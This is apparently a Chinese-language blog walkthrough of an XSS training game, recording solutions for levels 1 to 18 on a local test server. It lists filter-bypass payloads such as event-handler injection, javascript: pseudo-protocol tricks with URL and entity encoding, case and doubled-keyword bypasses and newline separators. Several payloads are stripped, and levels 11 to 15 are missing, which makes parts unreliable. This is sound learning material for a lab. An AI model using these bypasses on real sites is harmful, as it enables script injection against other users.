最近发现一个有趣的XSS闯关小游戏，游戏的作者是先知社区的大佬@Mramydnei，喜欢XSS的大家可以一起来学习交流。
现在我把自己在前面的十八关里面的闯关过程记录一下，大神绕行，我是菜鸟，大家可以一起学习，互相进步成长。
第一关，没有任何疑问，简单的不能再简单，没有任何过滤
输入点在url里面，参数name
输出点在页面里面，没有任何限制
所以可以构造payload
    http://127.0.0.1/xss/level1.php?name=
    http://127.0.0.1/xss/level1.php?name=
    http://127.0.0.1/xss/level1.php?name=
* * *
# XSS挑战之旅---level2
来到第二关，发现这次输入点在界面和url里面都有了
输出点还是在界面中
我们来尝试进行XSS试探
    test">
发现神奇的弹窗了，好吧，来看看源代码
显而易见，上面尖括号被过滤了，而下面却没有
这样的话，我们原来的payload是可以用的
    test">
    test">
    test">
* * *
# XSS挑战之旅---level3
来到第三关，前面都比较简单，就不具体叙述
输入点输出点见截图
这里过滤了尖括号
我们用事件来弹窗啦
    ' oninput=alert`1` //
    ' oninput=alert`1` '
    ' onchange=alert`1` //
    ' onchange=alert`1` '
* * *
# XSS挑战之旅---level4
第四关和第三关基本一样，真搞不懂考察什么
无非就是把源码里面单引号变成了双引号，同样事件弹窗
payload:
    " onchange=alert`1` "
    " onchange=alert`1` //
    " oninput=alert`1` "
    " oninput=alert`1` //
* * *
# XSS挑战之旅---level5
废话不多说了，剧情还是原来的剧情
直接上源码吧
    欢迎来到level5
    欢迎来到level5
    没有找到和test相关的结果.
    payload的长度:4
这次是on替换成了o_n script替换成了sc_ript  
很明显这是不让我们用事件和script啊
不想多说了，我自己走了弯路
现在直接发我的payload：
    "> click me //
    "> 111 //
    "> axxx //
* * *
# XSS挑战之旅---level6
来到level6，这一关测试的主要是大小写问题，可以用大小写绕过技术
    ">  //
    ">  //
有趣的事我自己用的编辑器也弹窗了，哈哈
* * *
# XSS挑战之旅---level7
来到第七关，这一关是针对script和on的过滤，我们可以构造来绕过
    " oonninput=alert(1) "
    "> alert`xss` //
* * *
# XSS挑战之旅---level8
来到了第八关，这一关难度加大，我们来继续
首先，我们需要先来进行测试一番
测试代码：
    "'%&#>xxx
    ' "> xxx">
这个服了，直接放弃
输出点2：
    xxx">友情链接
a标签内，href属性中，很明显，我们想到了协议绕过
    Javascript：伪协议后面可以使用URL编码。
            如：click me可成功执行弹窗。
            可用img就不行:
            因为href属性会跳转到其中的URL，而会进行URL解码，onerror属性只会执行JS,不跳转同时后面的url编码可以再做一次entity(HTML实体)编码：
            click me
ri ri
    javascript:%61lert(1)
    javascript:alert(1)
    javascript:alert(1)
    javascript:alert(1)
# XSS挑战之旅---level9
本题目难点在于它会自动检测url，如果发现没有带http:// 内容则会显示不合法，那么应该如何绕过呢？
href必须带着url!
    javascript:alert(1)//http://www.0aa.me  //利用注释
    javascript:%0dhttp://www.0aa.me%0dalert(1)  //不能用注释的情况下
针对题目，我们可以适当修改一下
    javascript:alert(1)//http://www.0aa.me
    javascript:%0dhttp://www.0aa.me%0dalert(1)  //
# XSS挑战之旅---level10
[http://127.0.0.1/xss/level10.php?keyword=well
done!](http://127.0.0.1/xss/level10.php?keyword=well%20done!)
输入点在url中，参数是keyword
首先测试以下过滤情况
    ' ">'
AngularJS ng-include 指令
ng-include 指令用于包含外部的 HTML 文件。
包含的内容将作为指定元素的子节点。
ng-include 属性的值可以是一个表达式，返回一个文件名。
默认情况下，包含的文件需要包含在同一个域名下。
    ```
    ```
    '">
# XSS挑战之旅---level16
​ 
过滤空格，script，/，使用%0d %0a做分割符
payload：
    /level16.php?keyword=
    http://127.0.0.1/xss//level16.php?keyword=
    http://127.0.0.1/xss//level16.php?keyword=
    http://127.0.0.1/xss//level16.php?keyword=
    http://127.0.0.1/xss//level16.php?keyword=
* * *
# XSS挑战之旅---level17
输入点在url，我们来寻找输出点
不要被flash迷惑。
输入点在url中，过滤了尖括号和双引号，用on事件触发。
payload：
    /level17.php?arg01=a&arg02= onmouseover=alert(1)
    http://127.0.0.1/xss//level17.php?arg01=a&arg02=b 8888 onmouseover=alert(1)
* * *
# XSS挑战之旅---level18
    http://127.0.0.1/xss//level18.php?arg01=a&arg02=b onmouseout=alert(1)
感觉17题和18题没啥区别啊
payload:
    http://127.0.0.1/xss//level18.php?arg01=a&arg02=b onmouseout=alert(1)
    http://127.0.0.1/xss//level18.php?arg01=a&arg02=b onmouseout=alert`1`
    http://127.0.0.1/xss//level18.php?arg01=a&arg02=b onmouseover=alert`1`
* * *
19关和20关属于Flash XSS，这里不再赘述，有兴趣的小伙伴们可以去深入学习。